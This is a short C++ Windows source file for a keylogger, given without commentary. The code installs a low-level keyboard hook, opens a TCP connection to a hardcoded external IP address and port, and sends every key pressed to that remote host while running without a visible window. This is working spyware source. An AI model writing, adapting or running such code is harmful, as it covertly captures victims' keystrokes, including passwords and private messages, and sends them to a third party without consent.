#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)
#define PORT 3600
#define IP "203.241.228.47"

HHOOK _hook;

void NetWorking_Init();
LRESULT CALLBACK Keyboard(int code, WPARAM wParam, LPARAM lParam);

class Using {
public:
	virtual ~Using() {
		UnHook();
		closesocket(sock);
		WSACleanup();
	}
	
	void SetHook() {
		HMODULE hInstance = GetModuleHandle(NULL);
		_hook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard, hInstance, NULL);
	}

	void UnHook() {
		UnhookWindowsHookEx(_hook);
	}

	void NetWorking_Init()
	{
		WSADATA wsaData;

		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
			return;

		sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock == INVALID_SOCKET)
			return;

		ZeroMemory(&sock_addr, sizeof(struct sockaddr_in));

		sock_addr.sin_family = AF_INET;
		sock_addr.sin_port = htons(PORT);
		sock_addr.sin_addr.S_un.S_addr = inet_addr(IP);

		if (::connect(sock, reinterpret_cast<SOCKADDR*>(&sock_addr), sizeof(SOCKADDR)))
			return;

		std::cout << "성공" << std::endl;
	}

private:
	friend LRESULT CALLBACK Keyboard(int code, WPARAM wParam, LPARAM lParam);
	SOCKET sock;
	SOCKADDR_IN sock_addr;
};
Using use;

LRESULT CALLBACK Keyboard(int code, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;
		if (code >= 0 && (int)wParam == 256) {
			send(use.sock, reinterpret_cast<char*>(&pKey->vkCode), sizeof(DWORD), 0);
		}
	}

	return CallNextHookEx(_hook, code, wParam, lParam);
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
{
	use.NetWorking_Init();
	use.SetHook();
	MSG msg;
	while (GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}